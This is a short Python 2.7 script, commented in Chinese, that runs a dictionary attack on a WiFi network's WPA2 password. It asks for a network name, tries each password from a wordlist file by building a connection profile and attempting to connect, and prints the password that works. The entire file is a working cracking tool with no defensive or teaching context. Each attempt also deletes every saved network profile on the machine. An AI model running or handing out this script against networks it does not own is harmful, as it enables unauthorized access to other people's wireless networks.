#!/usr/bin/python2.7
# -*- coding: UTF-8 -*-

import pywifi
from pywifi import const  #const是一个常量模块
import time

'''
步骤：
    1.导入模块
    2.抓取第一个网卡接口
    3.断开自身的WIFI连接
    4.从字典中读取密码，不断去尝试
    5.设置睡眠时间
'''
wifiname = raw_input("请输入要破解的Wifi名称：")
def wificrack(wifiname, wifipwd):
    '''创建一个wifi对象'''
    wifi = pywifi.PyWiFi()
    '''获取第一个网卡接口'''
    iface = wifi.interfaces()[0]
    # 断开自己的wifi连接
    iface.disconnect()
    # 设置睡眠时间
    time.sleep(0.5)
    if iface.status() == const.IFACE_DISCONNECTED:
        '''创建wifi连接文件'''
        profile = pywifi.Profile()
        # 接收wifi名称
        profile.ssid = wifiname
        # 接收wifi密码
        profile.key = wifipwd
        # 设置wifi的加密算法，现在大多是wpa2加密
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 验证开放算法
        profile.auth = const.AUTH_ALG_OPEN
        # 设置密码类型
        profile.cipher = const.CIPHER_TYPE_CCMP

        # 删除自身设备所有的wifi文件
        iface.remove_all_network_profiles()
        # iface.disconnect()
        # 设置新的连接文件
        temp_profile = iface.add_network_profile(profile)

        # 连接wifi
        iface.connect(temp_profile)
        time.sleep(2)
        if iface.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False

# 测试代码是否有错
# print(wificrack(807,123))
# exit()
# 读取密码字典
def rear_pwd():
    print("开始破解：")
    # 密码字典路径
    path = r'wifi_dic.txt'
    file = open(path, 'r')

    # 遍历字典
    while True:
        try:
            wifipwd = file.readline()
            bool = wificrack(wifiname, wifipwd)
            if bool:
                print("密码正确："+wifipwd)
                # 如果得到正确的wifi密码，则跳出循环
                break
            else:
                print("密码错误！"+wifipwd)
        except:
            continue
    file.close()
rear_pwd()